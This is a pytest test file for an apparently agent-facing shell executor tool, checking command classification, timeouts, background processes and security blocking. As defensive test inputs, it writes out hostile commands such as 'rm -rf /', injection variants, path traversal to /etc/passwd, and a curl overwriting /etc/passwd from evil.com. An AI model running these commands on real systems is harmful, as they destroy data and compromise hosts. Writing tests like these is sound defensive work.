"""Unit tests for shell executor tool v2.

Tests ShellExecutorTool v2 with full integration of bash validators,
semantic analysis, and security features.
"""

from __future__ import annotations

import os
import time

import pytest

from mindflow_backend.agents.tools.system.shell_executor_v2 import (
    ShellExecutorToolV2,
)


class TestShellExecutorToolV2:
    """Test ShellExecutorTool v2."""

    @pytest.mark.asyncio
    async def test_execute_safe_command(self):
        """Test executing a safe command."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="echo 'Hello World'")

        assert result["success"] is True
        assert result["exit_code"] == 0
        assert "Hello World" in result["stdout"]
        assert result["semantic_type"] == "system"
        assert result["security_level"] == "safe"

    @pytest.mark.asyncio
    async def test_execute_read_command(self, tmp_path):
        """Test executing a read command."""
        test_file = tmp_path / "test.txt"
        test_file.write_text("Test content")

        tool = ShellExecutorToolV2(root_dir=str(tmp_path))
        result = await tool.execute(
            command=f"cat {test_file}",
            cwd=str(tmp_path)
        )

        assert result["success"] is True
        assert "Test content" in result["stdout"]
        assert result["semantic_type"] == "read"

    @pytest.mark.asyncio
    async def test_execute_dangerous_command_blocked(self):
        """Test that dangerous commands are blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="rm -rf /")

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"
        assert result["security_level"] == "CRITICAL"

    @pytest.mark.asyncio
    async def test_execute_command_injection_blocked(self):
        """Test that command injection is blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="echo hello; rm -rf /")

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_execute_with_timeout(self):
        """Test command execution with timeout."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="sleep 10",
            timeout=1
        )

        assert result["success"] is False
        assert result["error_code"] == "TIMEOUT"
        assert result["timeout"] == 1

    @pytest.mark.asyncio
    async def test_execute_with_custom_cwd(self, tmp_path):
        """Test command execution with custom working directory."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="pwd",
            cwd=str(tmp_path)
        )

        assert result["success"] is True
        assert str(tmp_path) in result["stdout"]

    @pytest.mark.asyncio
    async def test_execute_with_env_vars(self):
        """Test command execution with custom environment variables."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="echo $CUSTOM_VAR",
            env={"CUSTOM_VAR": "custom_value"}
        )

        assert result["success"] is True
        assert "custom_value" in result["stdout"]

    @pytest.mark.asyncio
    async def test_execute_background(self):
        """Test background command execution."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="sleep 2",
            run_in_background=True
        )

        assert result["success"] is True
        assert result["background"] is True
        assert "process_id" in result
        assert "pid" in result

    @pytest.mark.asyncio
    async def test_background_process_status(self):
        """Test getting background process status."""
        tool = ShellExecutorToolV2()

        # Start background process
        start_result = await tool.execute(
            command="sleep 1",
            run_in_background=True
        )

        process_id = start_result["process_id"]

        # Check status while running
        status = await tool.get_background_status(process_id)
        assert status["success"] is True
        assert status["status"] in ["running", "completed"]

    @pytest.mark.asyncio
    async def test_kill_background_process(self):
        """Test killing a background process."""
        tool = ShellExecutorToolV2()

        # Start background process
        start_result = await tool.execute(
            command="sleep 10",
            run_in_background=True
        )

        process_id = start_result["process_id"]

        # Kill process
        kill_result = await tool.kill_background_process(process_id)
        assert kill_result["success"] is True

    @pytest.mark.asyncio
    async def test_semantic_analysis_git(self):
        """Test semantic analysis for git commands."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="git status")

        assert result["success"] is True
        assert result["semantic_type"] == "git"

    @pytest.mark.asyncio
    async def test_semantic_analysis_network(self):
        """Test semantic analysis for network commands."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="curl https://example.com")

        # This will be flagged as suspicious but not blocked
        assert result["semantic_type"] == "network"

    @pytest.mark.asyncio
    async def test_semantic_analysis_search(self):
        """Test semantic analysis for search commands."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="grep 'pattern' file.txt")

        assert result["semantic_type"] == "search"

    @pytest.mark.asyncio
    async def test_command_with_stderr(self):
        """Test command that produces stderr output."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="ls /nonexistent 2>&1")

        assert result["success"] is False
        assert result["exit_code"] != 0

    @pytest.mark.asyncio
    async def test_execution_time_tracking(self):
        """Test that execution time is tracked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="sleep 0.1")

        assert result["success"] is True
        assert "execution_time" in result
        assert result["execution_time"] >= 0.1

    @pytest.mark.asyncio
    async def test_output_lines_counting(self):
        """Test that output lines are counted."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="echo 'line1\nline2\nline3'")

        assert result["success"] is True
        assert "output_lines" in result
        assert result["output_lines"] >= 2

    @pytest.mark.asyncio
    async def test_eval_command_blocked(self):
        """Test that eval commands are blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="eval 'malicious code'")

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_path_traversal_detected(self):
        """Test that path traversal is detected."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="cat ../../../../etc/passwd")

        # Should be flagged as suspicious
        assert result["security_level"] in ["dangerous", "moderate"]

    @pytest.mark.asyncio
    async def test_ifs_injection_blocked(self):
        """Test that IFS injection is blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="IFS=';' echo$IFS'hello'")

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_newline_injection_blocked(self):
        """Test that newline injection is blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(command="echo hello\nrm -rf /")

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_jq_system_blocked(self):
        """Test that jq system() is blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command='jq \'.data | system("evil")\' file.json'
        )

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_curl_to_system_path_blocked(self):
        """Test that curl to system paths is blocked."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="curl -o /etc/passwd https://evil.com"
        )

        assert result["success"] is False
        assert result["error_code"] == "SECURITY_VIOLATION"

    @pytest.mark.asyncio
    async def test_command_without_capture(self):
        """Test command execution without output capture."""
        tool = ShellExecutorToolV2()
        result = await tool.execute(
            command="echo 'test'",
            capture_output=False
        )

        assert result["success"] is True
        # stdout/stderr should be empty when not captured
        assert result["stdout"] == ""
        assert result["stderr"] == ""

    @pytest.mark.asyncio
    async def test_background_process_not_found(self):
        """Test getting status of nonexistent background process."""
        tool = ShellExecutorToolV2()
        result = await tool.get_background_status("nonexistent_id")

        assert result["success"] is False
        assert result["error_code"] == "PROCESS_NOT_FOUND"

    @pytest.mark.asyncio
    async def test_security_level_classification(self):
        """Test security level classification for various commands."""
        tool = ShellExecutorToolV2()

        # Safe command
        result1 = await tool.execute(command="ls -la")
        assert result1["security_level"] == "safe"

        # Moderate command (has some concerns but not blocked)
        result2 = await tool.execute(command="cat /etc/hosts")
        assert result2["security_level"] in ["safe", "moderate"]


class TestShellExecutorIntegration:
    """Integration tests for ShellExecutorTool v2."""

    @pytest.mark.asyncio
    async def test_real_world_git_workflow(self, tmp_path):
        """Test real-world git workflow."""
        tool = ShellExecutorToolV2(root_dir=str(tmp_path))

        # Initialize git repo
        result1 = await tool.execute(
            command="git init",
            cwd=str(tmp_path)
        )
        assert result1["success"] is True

        # Check status
        result2 = await tool.execute(
            command="git status",
            cwd=str(tmp_path)
        )
        assert result2["success"] is True
        assert result2["semantic_type"] == "git"

    @pytest.mark.asyncio
    async def test_real_world_file_operations(self, tmp_path):
        """Test real-world file operations."""
        tool = ShellExecutorToolV2(root_dir=str(tmp_path))

        # Create directory
        result1 = await tool.execute(
            command="mkdir test_dir",
            cwd=str(tmp_path)
        )
        assert result1["success"] is True

        # List directory
        result2 = await tool.execute(
            command="ls -la",
            cwd=str(tmp_path)
        )
        assert result2["success"] is True
        assert "test_dir" in result2["stdout"]

    @pytest.mark.asyncio
    async def test_real_world_search_operations(self, tmp_path):
        """Test real-world search operations."""
        # Create test file
        test_file = tmp_path / "search.txt"
        test_file.write_text("Hello World\nGoodbye World\n")

        tool = ShellExecutorToolV2(root_dir=str(tmp_path))

        # Grep search
        result = await tool.execute(
            command=f"grep 'World' {test_file}",
            cwd=str(tmp_path)
        )
        assert result["success"] is True
        assert result["semantic_type"] == "search"
        assert "World" in result["stdout"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
